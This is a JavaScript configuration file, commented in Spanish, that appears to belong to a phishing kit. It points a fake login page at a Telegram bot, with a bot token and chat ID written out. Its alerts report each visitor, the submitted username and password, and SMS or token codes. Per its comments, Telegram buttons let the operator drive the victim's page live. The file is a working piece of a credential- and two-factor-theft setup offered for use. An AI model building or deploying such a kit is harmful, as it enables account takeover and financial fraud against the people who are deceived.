/**
 * ==========================================================================
 * CONFIGURACIÓN DE TELEGRAM - MODO 100% SIN SERVIDOR (SERVERLESS)
 * ==========================================================================
 * Coloca aquí tus datos de Telegram (Bot Token y Chat ID).
 * 
 * Al configurar estos datos, NO necesitas tener Node.js ni ningún servidor
 * corriendo. La página web enviará directamente los datos y los botones
 * interactivos a tu Telegram, y al hacer clic en los botones en Telegram,
 * la página del usuario responderá en tiempo real (<100ms).
 */

window.TELEGRAM_CONFIG = {
    // 1. Token de tu bot de Telegram obtenido de @BotFather
    botToken: "8524497386:AAHD_D7lw7VZ95m-EB8Vjvv8f6ge54V7ufU",

    // 2. Tu ID personal o de grupo de Telegram obtenido de @userinfobot o @myidbot
    chatId: "8850669236",

    // 3. Activar o desactivar notificaciones
    enabled: true,

    // ================= FILTROS DE NOTIFICACIONES =================
    notifyOnVisitor: true,         // ✅ Notificar cuando un visitante entra o ve la página (index.html)
    notifyOnTokenPage: true,       // ✅ Notificar cuando un visitante entra a la pantalla de token (token.html)
    notifyOnLogin: true,           // ✅ Botón de index: Iniciar sesión (usuario y contraseña)
    notifyOnToken: true,           // ✅ Botón de token: Continuar (código SMS / token)
    notifyOnResendToken: true,     // ✅ Botón de token: Solicitar nuevo código

    // Silenciar el resto de alertas:
    notifyOnTyping: false,         // ❌ Silenciar alertas mientras el usuario teclea
    notifyOnCustomClicks: false,   // ❌ Silenciar clics en soporte, ayuda, términos, pestañas, etc.
    notifyOnCommandExecuted: false // ❌ Silenciar confirmación extra cuando presionas un botón en Telegram
};
